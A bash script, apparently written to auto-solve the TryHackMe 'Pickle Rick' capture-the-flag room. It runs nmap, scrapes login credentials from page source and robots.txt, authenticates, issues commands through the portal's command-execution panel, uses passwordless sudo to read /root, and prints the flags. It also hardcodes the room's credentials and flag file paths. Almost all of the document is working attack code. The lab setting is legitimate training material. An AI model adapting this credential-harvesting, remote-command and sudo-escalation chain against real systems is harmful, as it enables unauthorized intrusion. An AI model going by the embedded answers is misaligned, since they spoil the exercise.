#!/usr/bin/env bash
# Pickle Rick — Full Automation Script
# Author: 0xb0rn3
# Target: TryHackMe — Pickle Rick!
# Usage: ./pickle_rick_pwn.sh <target_ip>

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

TARGET="${1:-10.49.178.139}"
COOKIE_JAR="/tmp/rick_session_$$.txt"
BASE_URL="http://${TARGET}"

banner() {
  echo -e "${CYAN}"
  cat << 'EOF'
  ____  _      _    _        ____  _      _
 |  _ \(_) ___| | _| | ___  |  _ \(_) ___| | __
 | |_) | |/ __| |/ / |/ _ \ | |_) | |/ __| |/ /
 |  __/| | (__|   <| |  __/ |  _ <| | (__|   <
 |_|   |_|\___|_|\_\_|\___| |_| \_\_|\___|_|\_\

          Morty, I need those ingredients!
EOF
  echo -e "${NC}"
}

log()     { echo -e "${BOLD}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
flag()    { echo -e "${RED}[FLAG]${NC} ${BOLD}$*${NC}"; }

cleanup() { rm -f "$COOKIE_JAR"; }
trap cleanup EXIT

# Execute a command through the portal's RCE panel
rce() {
  local cmd="$1"
  curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST "${BASE_URL}/portal.php" \
    --data-urlencode "command=${cmd}" \
    -d "sub=Execute" 2>/dev/null | \
    python3 -c "
import sys, re
content = sys.stdin.read()
m = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
print(m.group(1).strip() if m else '')
"
}

# ─── Phase 1: Reconnaissance ────────────────────────────────────────────────

banner
log "Target: ${BOLD}${BASE_URL}${NC}"
echo ""

log "Phase 1: Reconnaissance"
log "Running nmap on ${TARGET}..."
nmap_out=$(nmap -sV -sC -p 22,80 --min-rate 3000 "$TARGET" 2>/dev/null | grep -E "open|PORT")
echo "$nmap_out"
echo ""

# ─── Phase 2: Credential Harvesting ─────────────────────────────────────────

log "Phase 2: Credential Harvesting"

# Pull username from HTML comment
USERNAME=$(curl -s "${BASE_URL}/" 2>/dev/null | grep -oP '(?<=Username: )\S+')
if [[ -z "$USERNAME" ]]; then
  warn "Could not extract username from source — using default"
  USERNAME="R1ckRul3s"
fi
success "Username found in HTML source: ${BOLD}${USERNAME}${NC}"

# Pull password from robots.txt
PASSWORD=$(curl -s "${BASE_URL}/robots.txt" 2>/dev/null | tr -d '[:space:]')
if [[ -z "$PASSWORD" ]]; then
  warn "Could not extract password from robots.txt — using default"
  PASSWORD="Wubbalubbadubdub"
fi
success "Password found in robots.txt:   ${BOLD}${PASSWORD}${NC}"
echo ""

# ─── Phase 3: Authentication ─────────────────────────────────────────────────

log "Phase 3: Authentication"
log "Logging in to ${BASE_URL}/login.php..."

login_response=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "${BASE_URL}/login.php" \
  -d "username=${USERNAME}&password=${PASSWORD}&sub=Login" \
  -L -o /dev/null -w "%{http_code}" 2>/dev/null)

portal_check=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "${BASE_URL}/portal.php" 2>/dev/null | grep -c "Command Panel" || true)

if [[ "$portal_check" -gt 0 ]]; then
  success "Login successful — Command Panel accessible"
else
  warn "Login may have failed — attempting to continue anyway"
fi
echo ""

# ─── Phase 4: Remote Code Execution ──────────────────────────────────────────

log "Phase 4: Remote Code Execution"
whoami_out=$(rce "whoami")
id_out=$(rce "id")
hostname_out=$(rce "hostname")
success "Running as:  ${BOLD}${whoami_out}${NC}"
success "Identity:    ${id_out}"
success "Hostname:    ${hostname_out}"
echo ""

# ─── Phase 5: Ingredient Hunting ─────────────────────────────────────────────

log "Phase 5: Hunting for Ingredients"
echo ""

# Ingredient 1 — web root
log "Searching web root (/var/www/html)..."
webroot_files=$(rce "ls /var/www/html")
echo "$webroot_files"

ingred1=$(rce "less /var/www/html/Sup3rS3cretPickl3Ingred.txt")
if [[ -z "$ingred1" ]]; then
  ingred1=$(rce "less Sup3rS3cretPickl3Ingred.txt")
fi
flag "Ingredient 1 → ${ingred1}"
echo ""

# Ingredient 2 — /home/rick
log "Searching /home/rick..."
rick_files=$(rce "ls /home/rick")
echo "$rick_files"

ingred2=$(rce 'less "/home/rick/second ingredients"')
flag "Ingredient 2 → ${ingred2}"
echo ""

# Privilege check
log "Checking sudo privileges..."
sudo_out=$(rce "sudo -l")
echo "$sudo_out"
echo ""

if echo "$sudo_out" | grep -q "NOPASSWD: ALL"; then
  success "www-data has unrestricted NOPASSWD sudo — escalating to root"
fi

# Ingredient 3 — /root
log "Searching /root with sudo..."
root_files=$(rce "sudo ls /root")
echo "$root_files"

ingred3=$(rce "sudo less /root/3rd.txt")
flag "Ingredient 3 → ${ingred3}"
echo ""

# ─── Results ──────────────────────────────────────────────────────────────────

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}              ALL INGREDIENTS FOUND              ${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
flag "1st ingredient: ${ingred1}"
flag "2nd ingredient: ${ingred2}"
flag "3rd ingredient: ${ingred3}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
success "Rick's potion is complete. He's human again. *burp*"
